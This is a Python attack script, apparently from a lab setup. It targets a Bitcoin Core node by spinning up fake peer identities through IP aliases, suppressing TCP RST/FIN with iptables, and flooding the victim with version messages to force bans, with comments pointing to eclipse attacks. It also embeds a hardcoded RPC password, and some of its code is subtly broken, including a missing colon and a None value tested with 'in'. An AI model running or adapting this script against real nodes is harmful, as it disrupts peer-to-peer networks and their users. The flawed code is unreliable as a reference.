from _thread import start_new_thread
from bitcoin.messages import *
from bitcoin.net import CAddress
from io import BytesIO as _BytesIO
import atexit
import bitcoin
import fcntl
import hashlib
import json
import os
import random
import re
import socket
import struct 
import sys
import time

# Percentage (0 to 1) of packets to drop, else: relayed to victim
eclipse_packet_drop_rate = 0

num_identities = 1

victim_ip = '10.0.2.4'
victim_port = 8333

attacker_ip = '10.0.2.15'

identity_interface = [] # Keeps the IP alias interface and IP for each successful connection
identity_address = [] # Keeps the IP and port for each successful connection
identity_socket = [] # Keeps the socket for each successful connection

# The file where the iptables backup is saved, then restored when the script ends
iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'

# Send commands to the Linux terminal
def terminal(cmd):
	return os.popen(cmd).read()

# Send commands to the Bitcoin Core Console
def bitcoin(cmd):
	return os.popen('./../../src/bitcoin-cli -rpcuser=cybersec -rpcpassword=kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame -rpcport=8332 ' + cmd).read()

# Generate a random identity using the broadcast address template
def random_ip():
	#return f'10.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}'
	while(True):
		ip = broadcast_address
		old_ip = ''
		while(old_ip != ip):
			old_ip = ip
			ip = ip.replace('255', str(random.randint(0, 255)), 1)
		# Don't accept already assigned IPs
		if ip == victim_ip: continue
		if ip not in [x[0] for x in identity_address]: break
	return ip

# Create an alias for a specified identity
def ip_alias(ip_address):
	global alias_num
	print(f'Setting up IP alias {ip_address}')
	interface = f'{network_interface}:{alias_num}'
	terminal(f'sudo ifconfig {interface} {ip_address} netmask 255.255.255.0 broadcast {broadcast_address} up')
	alias_num += 1
	return interface

# Construct a version packet using python-bitcoinlib
def version_packet(src_ip, dst_ip, src_port, dst_port):
	msg = msg_version(bitcoin_protocolversion)
	msg.nVersion = bitcoin_protocolversion
	msg.addrFrom.ip = src_ip
	msg.addrFrom.port = src_port
	msg.addrTo.ip = dst_ip
	msg.addrTo.port = dst_port
	# Default is /python-bitcoinlib:0.11.0/
	msg.strSubVer = bitcoin_subversion.encode() # Look like a normal node
	return msg

# Close a connection
def close_connection(socket, ip, port, interface):
	socket.close()
	terminal(f'sudo ifconfig {interface} {ip} down')

	if socket in identity_socket: identity_socket.remove(socket)
	else: del socket
	if interface in identity_interface: identity_interface.remove(interface)
	if (ip, port) in identity_address: identity_address.remove((ip, port))
	print(f'Successfully closed connection to ({ip} : {port})')

# Creates a fake connection to the victim
def make_fake_connection(src_ip, dst_ip, verbose=True):
	src_port = random.randint(1024, 65535)
	dst_port = victim_port
	print(f'Creating fake identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')

	interface = ip_alias(src_ip)
	identity_interface.append(interface)
	if verbose: print(f'Successfully set up IP alias on interface {interface}')
	if verbose: print('Resulting ifconfig interface:')
	if verbose: print(terminal(f'ifconfig {interface}').rstrip() + '\n')

	if verbose: print('Setting up iptables configurations')
	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST,ACK -j DROP')
	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN -j DROP')
	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST -j DROP')

	if verbose: print('Creating network socket...')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	if verbose: print(f'Setting socket network interface to "{network_interface}"...')
	success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
	while success != 0
		success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
		time.sleep(1)
		print(network_interface)


	if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
	s.bind((src_ip, src_port))

	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
	s.connect((dst_ip, dst_port))

	# Send version packet
	version = version_packet(src_ip, dst_ip, src_port, dst_port)
	s.send(version.to_bytes())
	# Get verack packet
	verack = s.recv(1924)
	# Send verack packet
	verack = msg_verack(bitcoin_protocolversion)
	s.send(verack.to_bytes())
	# Get verack packet
	verack = s.recv(1024)

	if verbose: print('Connection successful!')

	identity_address.append((src_ip, src_port))
	identity_socket.append(s)

	# Listen to the connections for future packets
	if verbose: print('Attaching attacker script {interface}')
	try:
		start_new_thread(attack, (), {
			'socket': s,
			'src_ip': src_ip,
			'src_port': src_port,
			'dst_ip': dst_ip,
			'dst_port': dst_port,
			'interface': interface
		})
	except:
		print('Error: unable to  start thread to sniff interface {interface}')

def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
	while True:
		print(socket)
		try:
			socket.send(version_packet(src_ip, dst_ip, src_port, dst_port).to_bytes())
		except:
			break
	close_connection(socket, src_ip, src_port, interface)
	print(f'Peer was banned ({src_ip} : {src_port})')
	#make_fake_connection(random_ip(), dst_ip, False)

# Called when
def initialize_network_info():
	print('Retrieving network info...')
	global network_interface, broadcast_address

	# Get the network interface of the default gateway
	m = re.search(r'\n_gateway +[^ ]+ +[^ ]+ +[^ ]+ +([^ ]+)\n', terminal('arp'))
	if m != None:
		network_interface = m.group(1).strip()
	else:
		print('Error: Network interface couldn\'t be found.')
		sys.exit()

	# Get the broadcast address of the network interface
	# Used as an IP template of what can change, so that packets still come back to the sender
	m = re.search(r'broadcast ([^ ]+)', terminal(f'ifconfig {network_interface}'))
	if m != None:
		broadcast_address = m.group(1).strip()
	else:
		print('Error: Network broadcast IP couldn\'t be found.')
		sys.exit()

def initialize_bitcoin_info():
	print('Retrieving bitcoin info...')
	global bitcoin_subversion
	global bitcoin_protocolversion
	bitcoin_subversion = '/Satoshi:0.18.0/'
	bitcoin_protocolversion = 70015
	try:
		network_info = None #json.loads(bitcoin('getnetworkinfo'))
		if 'subversion' in network_info:
			bitcoin_subversion = network_info['subversion']
		if 'protocolversion' in network_info:
			bitcoin_protocolversion = network_info['protocolversion']
	except:
		pass

# Save a backyp of the iptable rules
def backup_iptables():
	terminal(f'iptables-save > {iptables_file_path}')

# Restore the backup of the iptable rules
def cleanup_iptables():
	if(os.path.exists(iptables_file_path)):
		print('Cleaning up iptables configuration')
		terminal(f'iptables-restore < {iptables_file_path}')
		os.remove(iptables_file_path)

# Remove all ip aliases that were created by the script
def cleanup_ipaliases():
	for i in range(0, len(identity_address)):
		ip = identity_address[i][0]
		interface = identity_interface[i]
		print(f'Cleaning up IP alias {ip} on {interface}')
		terminal(f'sudo ifconfig {interface} {ip} down')

# This function is ran when the script is stopped
def on_close():
	print('Closing open sockets')
	for socket in identity_socket:
		socket.close()
	cleanup_ipaliases()
	cleanup_iptables()
	print('Cleanup complete. Goodbye.')


# This is the first code to run
if __name__ == '__main__':
	global alias_num
	alias_num = 0 # Increments each alias

	initialize_network_info()
	initialize_bitcoin_info()

	atexit.register(on_close) # Make on_close() run when the script terminates
	cleanup_iptables() # Restore any pre-existing iptables before backing up, just in case if the computer shutdown without restoring
	backup_iptables()

	# Create the connections
	for i in range(1, num_identities + 1):
		try:
			make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip)
		except ConnectionRefusedError:
			print('Connection was refused. The victim\'s node must not be running.')

	print(f'Successful connections: {len(identity_address)}\n')

	# Prevent the script from terminating when the sniff function is still active
	while 1:
		time.sleep(60)